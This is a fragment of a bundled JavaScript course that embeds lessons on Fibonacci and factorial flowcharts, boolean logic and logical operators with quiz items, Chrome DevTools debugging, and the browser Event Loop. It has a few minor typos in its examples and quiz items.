N.^^\n\n__________________________________________________________________\n\n### ![ico-25 cap] Fibonacci series\n\n^^The Fibonacci series is a sequence of numbers, each of which is equal to the sum of the two preceding numbers.^^\n\n^^The first and second terms of the Fibonacci series are equal to 1.^^\n\n**Flowchart of the algorithm for calculating a Fibonacci series term by its number ~ N ~:**\n\n@@@@ 1\n![](illustrations/flowchart-fibonachi.svg)\n@@@@\n\n_______________________________________________________\n\n![ico-20 hw] **Exercise 3**\n\n^^Modify the flowchart of the algorithm for calculating the item of the Fibonacci series by it\'s number ** N** as follows:^^\n\n^^• Change the starting values of the variables.^^\n^^• Move the increment (increment) of the variable ** n** before the code branching block (where ** n** and ** N** are compared).^^\n\n~~~js\n  n = 1\n  a = 1\n  b = 1\n  F = 1   \n  n = n + 1\n  ...\n~~~\n\n_______________________________________________________\n\n![ico-20 hw] **Exercise 4**\n\n^^Draw a flowchart of the algorithm for calculating the factorial of a number N.^^\n\n^^**Factorial** of **N ** is the product of all numbers from 1 to ** N**.^^\n\n~~~js\nN! = 1 * 2 * 3 * 4 * .... * N\n~~~\n'},43511:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Logical language constructs\n\nIn this section we will learn about logical values, logical variables, logical expressions and logical operators.\n\n## ![ico-30 icon] Variables of logical type (boolean)\n\nWhen a person declares that his son is 18 years old, that statement will be true for one year, but before that year and after that year, that statement will be a lie. And that is on the condition that this person has a son.\n\n![](illustrations/logical-expressions.svg)\n\nSuppose a man wrote this statement on his social media page when he was 15 years old.\nHe did not yet have a son, and the statement was false.\nThen he grew up, got married and had a son, but the statement remained false because his son was not yet 18.\nFinally, when his son turned 18, the statement became true.\nBut it lasted for one year.\nThen his son turned 19, and this statement became false again.\n\nThus, this statement is a **variable**. For its meaning can change.\nThe values this variable can take are **~true~** or **~false~**\n.\n**~true~** and **~false~** are **logical values**.\n![ico-25 warn] **There are no other logical values.\n^^We don't have such a sly value as ‘Not everything is so unambiguous’. Everything is unambiguous. It's either black or white. Our world is simple.^^\n\nSo, our variable can take one of two possible logical values (**~true~** or **~false~**).\nIt is a variable of **logical type** (**~boolean~**).\n\n______________________________________\n\n## ![ico-30 icon] Logical expressions\n\nThe statement '_The apple is red and round_' can be decomposed into two parts: '_Apple is red_' + '_Apple is round_'.\n\n![](illustrations/logical-expressions-1.svg)\n\nI.e. we are actually dealing with two logical variables, each of which takes a logical value, i.e. is a variable of logical type.\n\n◘◘ ![ico-25 coffee] ** 1**◘◘\n~~~js\nvar apple = {\n  color: 'yellow',\n  shape: 'square'\n}\n~~~\n\nLet the boolean variable **~appleIsRed~** take the value **~true~** when the property **~apple.colour~** has the value ‘red’ and the boolean variable **~appleIsRound~** take the value **~true~** when the property **~apple.shape~** has the value ‘round’.\n\nThe **~appleIsRedAndRound~** variable takes the value **~true~** when the variable **~appleIsRed~** has the value **~true~** and the  variable **~appleIsRound~** has the value **~true~**, too.\n\n| apple.color | apple.shape | appleIsRed | appleIsRound | appleIsRedAndRound |\n|   'red'     |   'round'   |   ~true~   | ~true~       |   ~true~           |\n|   'yellow'  |   'round'   |   ~false~  | ~true~       |   ~false~          |\n|   'red'     |   'square'  |   ~true~   | ~false~      |   ~false~          |\n|   'green'   |   'square'  |   ~false~  | ~false~      |   ~false~          |\n\nThen the variable **~appleIsRedAndRound~** is already a **logical expression**, because it requires its value to be calculated based on the values of the variables **~appleIsRed~** and **~appleIsRound~**.\n\nAnd this logical expression will have the value **~true~** only when both variables **~appleIsRed~** and **~appleIsRound~** have the value **~true~**.\n\nA **Logical Expression** is an expression whose evaluation will result in a logical value.\n\nThe simplest case of a logical expression is a logical value.\n\nLet's see how we can construct more complex logical expressions.\n\n_________________________________________________________________________\n\n### ![ico-25 icon] Comparison operators\n\nThe simplest way to construct logical expressions is to use **comparison operators**.\nThese are binary operators, meaning they have two operands.\nThe operands can be variables or expressions.\n![ico-25 warn] Comparison operators compare not only the **values** but also the **data types** of the operands.\nComparison operators always return a **logical value**.\n\n| Operator  | Description |\n| **~==~**  | non-strict equality ^^(only operand values are compared, under the bonnet, data types are converted)^^ |\n| **~===~** | strict equality ^^(operand data types are compared, and if the operand data type is the same, the operand values are compared)^^ |\n| **~!=~**  | non-strict inequality ^^(values are not equal, data type is ignored)^^ |\n| **~!==~** | strict inequality ^^(will return ~true~ if the data types or values are not equal)^^ |\n| **~ > ~** | greater than |\n| **~ < ~** | less than |\n| **~>=~**  | greater than or equal to |\n| **~<=~**  | less than or equal to |\n\nString comparison is character-by-character.\nEach character has a numeric code, and the character codes are compared.\nIf the first characters of the string operands are equal, the next characters are compared, and so on until the code of the characters will be different.\n\n§§§§ Demo | boolean_01_template §§§§\n\n_________________________________________________________________________\n\n### ![ico-30 hw] Tests for comparison\n\n◘◘![ico-25 hw]** 1**◘◘\n\n→→→ 5 > '4' | true, false | true→→→\n\n◘◘![ico-25 hw]** 2**◘◘\n\n→→→ 5 !== '5' | true, false | true→→→\n\n◘◘![ico-25 hw]** 3**◘◘\n\n→→→ 10 != '10' | true, false | false→→→\n\n◘◘![ico-25 hw]** 4**◘◘\n\n→→→ true != 1 | true, false | false→→→\n\n◘◘![ico-25 hw]** 5**◘◘\n\n→→→ true !== '1' | true, false, 'It\\'s not all that clear-cut' | true→→→\n\n◘◘![ico-25 hw]** 6**◘◘\n\n→→→ true <= 1 | true, false | true→→→\n\n◘◘![ico-25 hw]** 7**◘◘\n\n→→→ 'abc' < 'cde' | true, false | true→→→\n\n◘◘![ico-25 hw]** 8**◘◘\n\n→→→ 'Welcome!'.length < 'How are you?'.length | true, false | true→→→\n\n__________________________________________________________________________\n\n## ![ico-30 icon] Logical operators\n\nThere are three logical operators in JS: **logical multiplication**, **logical addition** and **logical negation**.\n\nThe **logical negation** operator is a unary operator, meaning it has only one operand.\nThe logical operators of multiplication and addition are binary operators, they have two operands.\n\nLogical negation always returns a logical value, even if the operand is not a logical expression (or logical value).\nThe **logical multiplication**, **logical addition** operators do not always return a logical value.\n\nWhen performing logical operations under the bonnet, the engine casts the operands to the **~boolean~** data type.\nThis is called [►►►►**implicit type conversion**►►►►](page/Implicit-type-conversion).\n\nSince type conversion to type **~boolean~** is fairly straightforward, we can ‘get ahead of ourselves’ a bit:\n\n1. An empty string is cast to **~false~**. If the length of the string is greater than 0, such a string will be cast to **~true~** no matter what characters are in that string.\n2. Numbers other than 0 and **~NaN~** are cast to **~true~**, and 0 and **~NaN~** are cast to **~false~**.\n3. **~null~** and **~undefined~** are reduced to **~false~**.\n4. Any data structures (arrays, objects) are always cast to **~true~**, regardless of the contents of those data structures or the complete lack of contents.\n\n_____________________________________________\n\n### ![ico-25 icon] Negation operator\n\nThe statement ‘The apple is not red’ is the negation of the statement ‘The apple is red’.\nThat is, the apple can be any colour, just not red.\nIf we go back to Example 1:\n\n~~~js\nvar apple = {\n  color: 'yellow',\n  shape: 'square'\n}\n\nvar appleIsRed = apple.color === 'red'\nvar appleIsRound = apple.shape === 'round'\n~~~\n\nthen a new variable of logical type **~appleIsNotRed~** can be calculated based on the value of the variable **~appleIsRed~** by negation.\n\nJS uses the **~ !~** symbol (exclamation mark) for logical negation:\n\n~~~js\nvar appleIsNotRed = !appleIsRed\n~~~\n\n![ico-25 warn] Logical negation always returns a **boolean value** regardless of the data type of the operand.\nThat is, whatever the data type of the operand, the **~ !~** operator will always return the logical value **~true~** or **~false~**.\n\n◘◘![ico-25 coffee] ** 2**◘◘\n\n~~~js\n!(5 > 8)    // true\n\n// explanation:\n\n5 > 8      // false,\n!false     // true\n~~~\n\n◘◘![ico-25 coffee] ** 3**◘◘\n\n~~~js\n!(5 > 4)   // false\n\n// explanation:\n\n5 > 4      // true,\n!true      // false\n~~~\n\n§§§§ Demo | boolean_02_template §§§§\n\n____________________________________________________________\n\n### ![ico-25 icon] Logical multiplication\n\nSyntax: ~operand1 **&&** operand2~\n\nLet's go back to example 1:\n\n~~~js\nvar apple = {\n  color: 'yellow',\n  shape: 'square'\n}\n\nvar appleIsRed = apple.color === 'red'\nvar appleIsRound = apple.shape === 'round'\n~~~\n\nIf both operands are logical expressions (or logical variables), the result will be of data type ~boolean~.\n\n~~~js\nvar appleIsRedAndRound = appleIsRed && appleIsRound\n~~~\n\n§§§§ Demo | boolean_03_template §§§§\n\nIn the following examples, we use the logical operator **~&&~** to operands that are **logical expressions**.\nWe construct logical expressions using comparison operators.\n\n◘◘![ico-25 coffee] ** 4**◘◘\n\n~~~js\n5 > 8 && 4 < 5   // false  \n// explanation:\n5 > 8            // false\n4 < 5            // true\nfalse && true    // false\n~~~\n\n◘◘![ico-25 coffee] ** 5**◘◘\n\n~~~js\n8 < 5 && 4 < 5   // false\n// explanation:\n8 > 5            // false\n4 < 5            // true\nfalse && true    // false\n~~~\n\n◘◘![ico-25 coffee] ** 6**◘◘\n\n~~~js\nvar x = 4, y = 10, z = 8\n\nx > y && z < y   // false\n// explanation:\nx > y            // false,\nz < y            // true,\nfalse && true    // false\n~~~\n\n◘◘![ico-25 coffee] ** 7**◘◘\n\n~~~js\nvar x = 4, y = 10, z = 8\n\nx < y && z < y   // true\n// explanation:\nx < y            // true,\nz < y            // true,\ntrue && true     // true\n~~~\n\nHowever, this is JS, and we can apply logical operators to data of any type.\nIn this case, [►►►**implicit type conversion**►►►](page/Implicit-type-conversion) starts working, i.e. operands are cast to a logical type, and then the value of the expression is calculated as follows: if the logical value after casting the first operand to a logical data type is ~false~, then the value of the first operand is returned, otherwise the value of the second operand is returned.\n\n§§§§ Demo | boolean_04_template §§§§\n\nFor more complex expressions:\n\n![](illustrations/logical-operators.svg)\n\nNote the fact that the use of the logical operator **~&&~** does not uniquely determine the type of the result.\nThe data type of the value that will be obtained by the engine as a result of evaluating the expression depends on the data type of the operands.\n\n§§§§ Demo | boolean_05_template §§§§\n\n_________________________________________________\n\n### ![ico-25 icon] Logical addition\n\nSyntax: ~operand1 **◨** operand2~\n\n§§§§ Demo | boolean_06_template §§§§\n\n◘◘![ico-25 coffee] ** 8**◘◘\n\n~~~js\n5 > 8 || 4 < 5   // true\n\n// explanation:\n\n5 > 8            // false,\n4 < 5            // true,\nfalse || true    // true\n~~~\n\n◘◘![ico-25 coffee] ** 9**◘◘\n\n~~~js\n5 > 8 || 4 > 5   // false\n\n// explanation:\n\n5 > 8            // false,\n4 > 5            // false,\nfalse || false   // false\n~~~\n\n◘◘![ico-25 coffee] **10**◘◘\n\n~~~js\nvar x = 4, y = 10, z = 8\n\nx > y || z < y   // true\n\n// explanation:\n\nx > y            // false,\nz < y            // true,\nfalse || true    // true\n~~~\n\n◘◘![ico-25 coffee] **11**◘◘\n\n~~~js\nx > y || z > y   // false\n\n// explanation:\n\nx > y            // false,\nz > y            // false,\nfalse || false   // false\n~~~\n\nSo, logical addition works according to the principle: if after casting to the data type **~boolean~** **at least one of the operands** is **~true~**, the whole expression will have the value **~true~**. Since the values of the other operands will no longer change the result, the engine stops at the first operand that will yield **~true~** after type conversion. However, the **~◨~** operator returns not **~true~**, but the original value of the operand.\n\n![](illustrations/logical-operators-1.svg)\n\n◘◘![ico-25 coffee] **12**◘◘\n\n~~~js\nvar object = {\n  color: 'yellow',\n  shape: 'square',\n  size: 100\n}\n\nvar test = object.color === 'red' || object.shape === 'circle' || object.size > 50\n~~~\n\n~~~console\ntrue\n~~~\n_________________________________________________________________________\n\n![ico-25 exclamation] Regardless of the data type and value of the variable **~test~**:\n\n~~~js\n!test || !!test    // always  true\n\n!test && !!test    // always  false\n~~~\n\n_________________________________________________________________________\n\n### ![ico-25 icon] Tests\n\n◘◘![ico-25 hw] ** 1**◘◘\n\n~~~js\nvar x = undefined\n~~~\n\n→→→ x ◧ !x | undefined, null, true, false | true →→→\n\n◘◘![ico-25 hw] ** 2**◘◘\n\n~~~js\nvar x = undefined\n~~~\n\n→→→ x && !x | undefined, null, true, false | undefined →→→\n\n◘◘![ico-25 hw] ** 3**◘◘\n\n~~~js\nvar x = null\n~~~\n\n→→→ x ◧ !x | undefined, null, true, false | true →→→\n\n◘◘![ico-25 hw] ** 4**◘◘\n\n~~~js\nvar x = null\n~~~\n\n→→→ x && !x | undefined, null, true, false | null →→→\n\n◘◘![ico-25 hw] ** 5**◘◘\n\n~~~js\nvar x = NaN\n~~~\n\n→→→ x ◧ !x | NaN, null, true, false | true →→→\n\n◘◘![ico-25 hw] ** 6**◘◘\n\n~~~js\nvar x = NaN\n~~~\n\n→→→ x && !x | NaN, null, true, false | NaN →→→\n\n◘◘![ico-25 hw] ** 7**◘◘\n\n~~~js\nvar x = 5\n~~~\n\n→→→ x ◧ !x | NaN, null, 5, true, false | 5 →→→\n\n◘◘![ico-25 hw] ** 8**◘◘\n\n~~~js\nvar x = 5\n~~~\n\n→→→ x && !x | NaN, null, 5, true, false | false →→→\n\n\n◘◘![ico-25 hw] ** 9**◘◘\n\n~~~js\nvar x = 'Hi!'\n~~~\n\n→→→ x ◧ !x | undefined, 'Hi!', true, false | Hi! →→→\n\n\n◘◘![ico-25 hw] **10**◘◘\n\n~~~js\nvar x = 'Hi!'\n~~~\n\n→→→ x && !x | undefined, 'Hi!', true, false | false →→→\n\n◘◘![ico-25 hw] **11**◘◘\n\n~~~js\nvar x = ''\n~~~\n\n→→→ x ◧ !x | undefined, '\"\"', true, false | true →→→\n\n\n◘◘![ico-25 hw] **12**◘◘\n\n~~~js\nvar x = ''\n~~~\n\n→→→ x && !x | undefined, '\"\"', true, false | \"\" →→→\n\n\n◘◘![ico-25 hw] **13**◘◘\n\n~~~js\nvar x = 4, y = 10\n~~~\n\n→→→ (x > y) ◧ (x < 5) | 4, 10, true, false | true →→→\n\n\n◘◘![ico-25 hw] **14**◘◘\n\n~~~js\nvar x = 4, y = 10\n~~~\n\n→→→ (x > y) && (x < 5) | 4, 10, true, false | false →→→\n\n\n◘◘![ico-25 hw] **15**◘◘\n\n~~~js\nvar students = ['Piter', 'Anna', 'Demid', 'Josef']\n~~~\n\n→→→ students.length && students[1] | 4, 'Piter', 'Anna', 'Demid', 'Josef', true, false | Anna →→→\n\n\n◘◘![ico-25 hw] **16**◘◘\n\n~~~js\nvar students = ['Piter', 'Anna', 'Demid', 'Josef']\n~~~\n\n→→→ students.length ◧ students[2] | 4, 'Piter', 'Anna', 'Demid', 'Josef', true, false | 4 →→→\n\n\n◘◘![ico-25 hw] **17**◘◘\n\n~~~js\nvar students = ['Piter', 'Anna', 'Demid', 'Josef']\n~~~\n\n→→→ students.length > 4 ◧ students[2] | 4, 'Piter', 'Anna', 'Demid', 'Josef', true, false | Demid →→→\n\n\n◘◘![ico-25 hw] **18**◘◘\n\n~~~js\nvar array = [true, 'Google', NaN, undefined]\n~~~\n\n→→→ array.length > 4 ◧ typeof array[2] | 4, 'string', 'number', 'boolean', 'object', true, false | number →→→\n\n◘◘![ico-25 hw] **19**◘◘\n\n~~~js\nvar array = [true, 'Google', NaN, undefined]\n~~~\n\n→→→ array.length > 4 ◧ typeof array[2] | 4, 'string', 'number', 'boolean', 'object', true, false | number →→→\n\n\n◘◘![ico-25 hw] **20**◘◘\n\n~~~js\nvar alpha = NaN\nvar betta = typeof alpha\n~~~\n\n→→→ b === 'number' | NaN, 'number', 'boolean', true, false | true →→→\n\n\n◘◘![ico-25 hw] **21**◘◘\n\n~~~js\nvar alpha = NaN\nvar betta = typeof alpha === 'string'\n~~~\n\n→→→  !a && !b | NaN, true, false | true →→→\n"},51049:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 icon] Chrome DevTools\n\n[![ico-20 link] Chrome DevTools](external/dev-tools)\n_____________________________________________________________\n\n## ![ico-25 icon] Sources\n\nOpen the [**page**](samples/02).\n\nGo to the **Sources** tab of the developer panel:\n![](illustrations/lesson-01-1.png)\n\nOn the left we see the navigation panel:\n@@@@\n![](illustrations/lesson-01-nav-panel.png)\n<br><br>To view the code of the loaded page, use the button **~>>~** and open **_Pages_**.<br>Now you can see the project structure in the navigation panel and you can select a file to view.<br>Select the project file, the contents of which will be displayed in the center (**index02.js**).\n@@@@\n\nOn the right side you see the panel of the debugger itself:\n@@@@ 1\n![](illustrations/lesson-01-debugger.png)\n@@@@\n_________________________________________________________\n\nYou can work not only with the code of an open page in the debugger.\n\nYou can create your own piece of code that you want to debug.\n\n### ![ico-20 icon] Snippet\n\nUsing the same **~>>~** button in the navigation panel, select **_Snippets_**.\n\n**Snippet** - is a piece of code that is stored in the browser for quite a long time under the name you give it.\n\nTo add a new code fragment, click on the button •• + New Snippet •• in the left navigation bar and give your snippet a title.\n\n![](illustrations/lesson-01-2.png)\n\n@@@@\nNext, you can paste the snippet code in the center, save the changes (Ctrl+S) and run the snippet code for execution ► **Ctrl + Enter**.<br><br>^^If the changes have not been saved, then the modified snippet will be displayed in the navigation panel (on the left) marked with ~ * ~.^^\n![](illustrations/lesson-01-snippet.png)\n@@@@\n\n________________________________________________________________________\n\n## ![ico-25 icon] Debugger\n\nThe most important sections of the debugger that you will need to master first are:\n\n| Watch | Call Stack | Scope | Breakpoints |\n\nTo track the values ​​of variables, we use the section **Watch**.\n@@@@\nIn this section you can add the names of the variables whose values ​​you want to track.\n![](illustrations/lesson-01-watch.png)\n@@@@\n\nBut in order to see how these values ​​change during code execution, you need to set **~breakpoints~**.\n\n@@@@\nThis is quite easy to do directly in the snippet code.<br>All lines of code are numbered, and just click on the line number to set a breakpoint.\n![](illustrations/lesson-01-breakpoints.png)\n@@@@\n\nAfter running the snippet (► **Ctrl + Enter**) , the engine will execute line by line until it reaches the next **~breakpoint~**.\nHere the engine will pause executing the code, and you will be able to see the current values ​​of the variables you are watching, and then resume executing the code from where you left off.\nYou can also make changes to the code, save your changes (**~Ctrl + S~**) and resume code execution.\nAfter resuming, the new version of the code will work.\n\n@@@@\n![](icons/debugger-panel.png)\nTo resume the execution of the code, use the button ![ico-40 debug-button].\n@@@@\n\n![ico-25 warn] After setting the ~breakpoints~, you need to reload the page ![reload].\n\n![](illustrations/lesson-01-debugger.gif)\n\n_______________________________________________________\n\n![ico20] You can also track changes in variable values in the **~Scope~** section of the debugger:\n• Local - local variables of the function being executed.\n• Block - variables of the call context of the executable function.\n\n![ico-20 warn] Keep track of what function is currently running in the **~Call Stack~**.\n\n_____________________________________________________________________________\n\n### ![ico-25 icon] Event Listener Breakpoints\n\nIn **Chrome DevTools**, you can also suspend code execution when DOM events occur.\n\n![](illustrations/Chrome-devtools-breakpoints.gif)\n\n_______________________________________________________\n\n[![ico-70 youtube]](https://youtu.be/PQYG2aJf6uI/)\n"},56542:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 icon] Event Loop\n\n## ![ico-25 icon] Basic concepts\n\n![ico-20 pin] A **process** is an instance of an executable program that is allocated system resources (CPU time and memory).\n\n![ico-20 pin] A **thread** is a sequence of commands (language statements, function calls, etc.) that are executed sequentially one after the other.\n\nMultiple threads can exist within the same process and share resources (memory).\n\n^^^[Process and thread]\n^^![ico-20 warn] Each process runs in a separate address space.^^\n^^![ico-20 warn] One process cannot access the data of another process.^^\n^^![ico-20 warn] Each program creates at least one main thread that runs the function **~main()~**.^^\n^^![ico-20 warn] A program that uses only the main thread is **_single-threaded_**.^^\n\n^^Multithreaded languages use multiple threads.^^\n^^In multiprocessor (multi-core) systems, each processor (core) serves a separate thread, so threads do run in parallel (concurrently).^^\n^^If there is only one processor, it has to switch from one thread to another quite often to create an illusion of simultaneous code execution in all threads.^^\n^^^\n\nA **stack** is a \"fast\" chunk of RAM.\n\n^^^[Stack]\n^^A stack is created for each thread in multithreaded languages.^^\n^^The stack is organised according to the LIFO principle (last in, first out).^^\n^^The stack size is limited.^^\n^^It is set when creating a thread.^^\n^^Variables in the stack are always local (**private**).^^\n^^^\n\n**Heap** is RAM where **global variables** are stored.\n\n^^^[Heap]\n^^The **heap** allows dynamic memory allocation.^^\n\n^^Access to data stored in the **heap** is provided by means of references - variables whose values are addresses of other variables.^^\n\n^^That is why the heap is slower than the stack.^^\n\n^^The processor does not control the **heap** (unlike the **stack**), so **~Garbage Collectors~** are required to free the heap memory from unnecessary variables.^^\n^^^\n\n![ico-25 warn] JS is a single-threaded language, so we only have one stack (**~Call Stack~**).\n\n____________________________________\n\n## ![ico-25 icon] Async stuff\n\n☼☼☼ Asynchrony is event domination ☼☼☼\n\nOne of the main properties of events is that the time of their occurrence is unpredictable.\nWhat cannot be predicted is impossible to synchronize.\n\nWe don't know in advance when the user will click on the button, or if he or she will click at all.\nWhen sending a request to the server, we cannot predict how many milliseconds it will take for us to receive a response from the server.\n\nThe second property of most events is that the result of the occurrence of the event is not determined.\n\n@@@@\nWe can't predict with certainty whether the server's response status will be successful, or if the server will return an http error code to us.\n![](illustrations/async-fynny-02.gif)\n@@@@\n\nIf we can't manage events, then we can let the events control our code.\n\n## ![ico-25 icon] Event-Driven Programming\n\nAsynchronous programming is all about binding functions to specific events.\nThis is the so-called **event-driven programming**.\n\nClearly, the environment (platform) where your application will run must have a mechanism that provides event reactivity.\nThat is, such a mechanism should provide your application with some kind of **Event API** (<b>A</b>pplication <b>P</b>rogramme <b>I</b>nterface), the services of which will allow you to bind your functions to certain events.\nThe same mechanism should ensure that your functions are launched for execution when the corresponding event occurs.\n\nThe browser has such a mechanism, and it is called **Event Loop**.\n\n**_Event Loop_** is an endless loop of task execution.\n\n[%%%MDN%%%](external/mdn-event-loop)\n\n________________________________________\n\n## ![ico-25 icon] Callback\n\n![ico-20 warn] **Only functions are executed in JS.**.\nTo execute a script, you first need to create an execution context, which will be placed on the **Call Stack**.\nThat's why it's called **Call Stack**.\nWhat can you call? - only **~function~**.\n\n@@@@ 1\n![](illustrations/event-loop-01.png)\n@@@@\n\nThere are two ways to call a function: **direct call** and **callback**.\n\n**Direct call** - when a function is called by name from the script that is currently being executed.\n\nExecuting means that some script is already “sitting” in **Call Stack**.\nIt can make a **direct call** to any other function.\nBut how did it get into **Call Stack**?\n\n![ico-20 yes] The first thing in the **Call Stack** is always **callback** function.\n\n**Callback** is an event-bound function that will be pushed onto the **Call Stack** through the **Event Loop** mechanism.\n\n@@@@ 1\n![](illustrations/event-loop-script.png)\n@@@@\n\n^^Here the snippet script was “wrapped” in a certain function **~anonimous~**, tied to the “run script ~anonimous~” event, after which this event was fired.^^\n^^As a result, the script **~anonimous~** “occupied” the Call Stack and began to be executed.^^\n^^The **~anonimous~** function became a callback and went through the **Event Loop**.^^\n^^Now **~anonimous~** from the call stack can make **direct calls** to other functions.^^\n----------------------------\n@@@@ 1\n![](illustrations/event-loop-02.png)\n@@@@\n\n^^The **~parent~** function was called from the **~anonymous~** script. This is a **direct call**.^^\n----------------------------\n@@@@ 1\n![](illustrations/event-loop-03.png)\n@@@@\n\n^^The **~demo~** function was called from the **~parent~** script. This is a **direct call**.^^\n\n^^As we can see, they all “sit” on the call stack at the same time.^^\n^^At the top there is always the function that is currently being executed.^^\n^^The **~parent~** function and the **~demo~** function hit the call stack by direct \"invitation\".^^\n_________________________________________________\n\nBut we have one more (anonymous) function, which we assigned as a handler for the **~click~** event of the ~document.body~ element.\nThis function is by definition a **callback** function.\nNote that the callback does not need a name. This is usually an anonymous function.\nIt is tied to the event.\nIt can only be started for execution by the **Event Loop** mechanism.\nIf the event happens, the callback will get a chance to go on the Call Stack.\nHowever, it will have to queue up, because there may be many events, and the callbacks associated with them form a **task queue**.\n\n@@@@ 1\n![](illustrations/event-loop-04.png)\n@@@@\n\nSo, we see that the **callback** always gets into Call Stack first.\nAnd being in the Call Stack, it can call other functions.\nAnd each function being started by **dicrect call** will be in the **Call Stack** at the same time with script that called it.\n\n@@@@ 1\n![](illustrations/event-loop-05.png)\n@@@@\n\nThis function can call another function, whose execution context will also appear on the call stack.\nSo they will form a “layer cake” in Call Stack.\nThe function called last will be at the top of the Call Stack.\nIt will be the first to leave Call Stack.\n\n@@@@ 1\n![](illustrations/event-loop-06.png)\n@@@@\n\nThe last one to leave the **Call Stack** is the **callback**, which gave birth to this entire \"pyramid\".\nPlease note that each callback will occupy our single **Call Stack** until all its code will be executed to the last line.\nIt can call any number of functions, which can also call functions.\nUntil this entire team leaves **Call Stack**, other callbacks will languish in the **task queue**.\n\nSo, the difference between the two ways for a function to get into the **Call Stack**:\n\n| **Direct call** | **Callback** |\n| The function will be executed immediately | The callback will be added to the task queue |\n| Function will get in the Call Stack when the script that called this function is there | Callback will get in the Call Stack only when Call Stack will be free |\n\n_____________________\n\n@@@@\n![](images/funcs-rule.png)\nAs we can see, not only the inheritance model, but also asynchrony in JS is based on functions.<br><br>In the prototypical inheritance model, **constructor** functions rule, and in asynchronous inheritance, **callback** functions rule.\n@@@@\n\n☼☼☼ functions actually rule in JS! ☼☼☼\n\n___________________________________________\n\n## ![ico-25 icon] Event API\n\n@@@@ 3\nFor obvious reasons, the JS engine does not track events.<br><br>The browser does this.\n![](illustrations/js-engine.png)\n^^The browser is an intermediary between the operating system and the engine, it tracks keyboard events, mouse events, system clock, etc.^^\n@@@@\n\nThe browser can send requests to the network and receive responses.\n\n@@@@\nAs a \"middleman\", the browser offers an application programming interface (**API**) that allows the JS application to access the powerful capabilities of the browser.<br><br>The browser has an API for working with events, and it can be called **Event API**.\n![](illustrations/web-api.png)\n@@@@\n\nThis term covers various interfaces and methods that allow you to work with events in web applications (more common names:  **Event Handling API** or **Event Listener API**).\n\nThe simplest example of a browser API is the global object method **~setTimeout~**.\nWith its help, we pass a callback to the browser and indicate how many milliseconds later this callback should get into the **task queue**.\nNext, the engine ‘washes its hands of it’ because the events are tracked by the browser. The timer is set, and the browser will promptly inform the engine that the time has expired.\nWhen the timer expires, the timer callback will be placed to the end of the **task queue**.\nIt's not a fact that it will get onto the Call Stack quickly enough.\nThere may be many callbacks in the **task queue**, and the timer callback will have to wait for its turn.\nThe engine will pull this callback from the **task queue** when it is its turn and the **Call Stack** is free.\n\n◘◘![ico-20 cap] ** 1**◘◘\n~~~js\nconst start = Date.now()\nconst timer = (time = 0) => setTimeout(() => console.log(Date.now() - start), time)\nlet counter = 0\ndo {\n  timer(500)\n} while (counter++ < 10000)\n~~~\n\n{{{event-loop-01.js}}}\n\nNote that all timers were set to 500 milliseconds.\nHowever, the large number of timer callbacks in the task queue led to the fact that the delay in next callback execution increased as the task queue progressed, and ultimately the last callback entered the call stack not after 500 milliseconds, but much later.\n\n__________________________________________\n\n## ![ico-25 icon] Blocking operations\n\n![ico-20 warn] **“Heavy” tasks block the browser from redrawing the page and make the page non-interactive, i.e. not responding to user actions.**\nA \"heavy\" task is a task that will occupy the stack for a long time and can seriously delay the execution of other tasks in the queue that had the misfortune of getting there after it...\n\n@@@@\n![](illustrations/event-loop-queue.png)\n^^It's like waiting in line at a doctor's office in a clunky Soviet system.<br>You have an appointment at 2:00 PM, it's already 3:25 PM, and there are still five people ahead of you.<br>^^\n^^What does this tell you?<br>It tells you the code is extremely poorly written.^^\n^^<br>Yes, the Soviet system was poorly written code.^^\n@@@@\n\nWrite code so that no function takes up the Call Stack for long.\nOtherwise, your page will stop responding to events because the callbacks won't be able to get into the call stack.\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js\nfunction message (text) {\n  document.body.innerHTML += `<small>${text}</small><br>`\n}\n\nlet start = new Date().getTime()\n\nsetTimeout(() => message(`Timer real time: ${new Date().getTime()-start} ms` ), 0)\n\nfor (var x = 0; x < 1000000000; x++) continue\n\nmessage('Loop \\'for\\' finished')\n~~~\n\nIn this example, the timer was set to a delay of 0 seconds.\nLook what happened\n\n{{{Event-Loop-1.js}}}\n\n__________________________________________________________\n\nLet's declare the auxiliary functions **~createFigure~** and **~message~**:\n\n◘◘![ico-20 cap] **createFigure**◘◘\n~~~js\nfunction createFigure () {\n  const figure = section\n    .appendChild(document.createElement('div'))\n  return Object.assign(figure, {\n    style: `\n      position: absolute;\n      top: 108px;\n      left: 48px;\n      width: 100px;\n      height: 100px;\n      border-radius: 4px;\n      background: #fa0;\n    `,\n    move () {\n      const { left } = figure.style\n      Object.assign(figure.style, {\n        left: parseInt(left) + 2 + 'px'\n      })\n      Date.now() - start < 5000 && requestAnimationFrame(figure.move)\n    }\n  })\n}\n~~~\n\n◘◘![ico-20 cap] **message**◘◘\n~~~js\nfunction message (text) {\n  document.body\n    .appendChild(document.createElement('p'))\n    .innerHTML = `${Date.now() - start}: ${text}`\n}\n~~~\n\nto use them in the following examples.\n\n◘◘![ico-20 cap] ** 3**◘◘\n\n~~~js\nconst start = Date.now()\n\nconst figure = createFigure()\n\nmessage('Well, you\\'re screwed, kid, now wait for the cycle to complete....')\n\nfigure.move()\n\nsetTimeout(function () {\n  message('<b>Loop started</b>')\n  for (var counter = 0; counter < 10000000000; counter++) continue\n  message('<b>Loop finished</b>')\n}, 0)\n~~~\n\n{{{Event-Loop-3.js}}}\n\nA task launched by a timer occupies the call stack for a long and blocks page redrawing and message output to the console.\n\nTake a lesson from this example and then you will understand why we cannot create modal windows.\nThe browser is multi-threaded and each thread has its own call stack, so modal windows are not a problem for it.\nBut we only have one call stack.\n\n____________________________________\n\nLet's fix the problem:\n\n◘◘![ico-20 cap] ** 4**◘◘\n~~~js\nconst section = document.body\n\nconst start = Date.now()\n\nconst figure = createFigure()\n\nfigure.move()\n\nconst recurse = (counter => {\n  message('<b>Loop started</b>')\n  return function () {\n    if (counter-- > 0) setTimeout(recurse)\n    else message('<b>Loop finished</b>')\n  }\n})(1000)\n\nrecurse()\n~~~\n\n{{{Event-Loop-4.js}}}\n\nAs you can see, the loop works as if “in the background”, without blocking screen redraw and other operations.\nHowever, “background mode” is not possible for us, since JS is single-threaded, with one call stack.\nTherefore, we simulate \"multithreading\" using **Event Loop**.\n\nLater we'll look at asynchronous generators, which do something similar.\n______________________________\n\n## 